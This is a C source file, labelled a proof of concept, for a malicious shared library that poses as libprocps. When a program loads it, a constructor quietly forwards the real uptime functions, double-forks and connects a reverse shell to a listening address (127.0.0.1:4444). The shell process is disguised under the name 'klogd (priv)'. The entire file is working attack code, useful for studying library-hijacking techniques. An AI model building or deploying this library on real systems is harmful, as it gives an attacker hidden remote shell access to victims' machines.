/*
 * libkitten.c
 * Wraps a couple of libprocps functions and spawns a shell; PoC
 * By J. Stuart McMurray
 * Created 20171110
 * Last Modified 20171110
 */

#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/socket.h>

#include <arpa/inet.h>
#include <netinet/in.h>

#include <dlfcn.h>
#include <err.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <unistd.h>

/* Listening address and port */
#define ADDR "127.0.0.1"
#define PORT 4444

/* Path of program to use as shell */
#define PATH "/bin/sh"
/* Argument vector of child process */
#define ARGV (char *const[]){"klogd (priv)", NULL}

/* Exported functions */
int  uptime(double *, double *);
void print_uptime(int);

/* Constructor, called when library is loaded */
static void con(void) __attribute__((constructor));
/* Middle of the double-fork */
static void middle(void);
/* Child in the double-fork, makes a reverse shell */
static void child(void);
/* Pointers to the real versions of the exported functions */
static int  (*kitten_uptime)(double *, double*) = NULL;
static void (*kitten_print_uptime)(int) = NULL;

void con(void) {
	
	char *e;

	/* Load the real libprocps */
	if (NULL == dlopen("libprocps.so.4", RTLD_NOW|RTLD_GLOBAL))
		errx(1, "dlopen: %s", dlerror());

	/* Grab the real functions */
	dlerror();
	kitten_uptime = dlsym(RTLD_NEXT, "uptime");
	if (NULL != (e = dlerror()))
		err(2, "dlsym uptime: %s", e);
	dlerror();
	kitten_print_uptime = dlsym(RTLD_NEXT, "print_uptime");
	if (NULL != (e = dlerror()))
		err(3, "dlsym print_uptime: %s", e);

	/* Fork off a shell */
	signal(SIGCHLD, SIG_IGN);
	switch (fork()) {
	case 0: /* Child */
		middle();
		break;
	case -1: /* Error */
		warn("fork");
		break;
	}
}

/* Exported functions which call real functions */
int uptime(double *a, double *b) {
	return kitten_uptime(a, b);
}
void print_uptime(int a) {
	kitten_print_uptime(a);
}

/* Middle child in the double-fork */
void
middle(void)
{
	if (-1 == setsid())
		err(4, "setsid");
	switch (fork()) {
	case 0: /* Child */
		child();
		break;
	case -1: /* Error */
		err(5, "fork");
		break;
	default: /* Parent */
		break;
	}
	exit(0);
}

/* Real child, which won't have a proper ppid. */
void
child(void)
{
	int fd, i;
	struct sockaddr_in sa;

	/* Connect back */
	bzero(&sa, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_port = htons(PORT);
	sa.sin_addr.s_addr = inet_addr(ADDR);
	if (-1 == (fd = socket(AF_INET, SOCK_STREAM, 0)))
		err(6, "socket");
	if (-1 == connect(fd, (struct sockaddr *)&sa, sizeof(sa)))
		err(7, "connect");
	
	/* Hookup shell */
	for (i = 0; i < 1024; ++i)
		if (fd != i)
			close(i);
	for (i = 0; i < 3; ++i)
		dup2(fd, i);
	if (-1 == execv(PATH, ARGV))
		err(8, "execl");
}
